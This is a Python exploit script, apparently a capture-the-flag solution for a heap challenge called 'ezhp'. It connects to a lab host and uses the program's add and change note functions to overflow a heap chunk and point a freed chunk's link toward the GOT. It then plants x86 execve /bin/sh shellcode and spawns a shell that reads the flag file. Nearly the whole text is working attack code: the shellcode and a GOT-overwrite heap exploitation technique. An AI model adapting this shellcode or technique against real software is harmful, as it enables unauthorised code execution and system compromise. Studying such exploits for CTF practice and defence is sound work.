from err0rless import *

# socat TCP-LISTEN:2717,reuseaddr,fork EXEC:"strace -if ./ezhp"
#s, t = connst("192.168.95.150", 2719) # xinetd
s, t = connst("192.168.95.150", 3344) # socat

# Linux x86 execve /bin/sh
sc = "\xEB\x06\x90\x90\x90\x90\x90\x90"
sc += "\x6A\x0B\x58\x99\x52\x68\x2F\x2F\x73\x68"
sc += "\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\xCD\x80"

def add_note(size):
	s.send("1\n")

	print t.read_until("size.\n")
	s.send(str(size) + "\n")

	print t.read_until("option.\n")

def change_note(id, size, data):
	s.send("3\n")

	print t.read_until("id.\n")
	s.send(str(id) + "\n")
	
	print t.read_until("size.\n")
	s.send(str(size) + "\n")
	
	print t.read_until("data.\n")
	s.send(data + "\n")

	print t.read_until("option.\n")

def pmain():
	print t.read_until("option.\n")

	add_note(128) # id 0
	add_note(128) # id 1
	add_note(128) # id 2

	data  = "A" * (132+4)
	data += struct.pack("<I", 0x0804A000)
	# note1->prev = puts@got

	change_note(0x01, 132 + 8, data)

	change_note(0x00, 132+len(sc), "A"*132+sc)

	s.send("2\n")
	print t.read_until("id.\n")

	s.send("2\n")

	s.send("cat /home/ezhp/flag\n")
	print s.recv(1024)


pmain()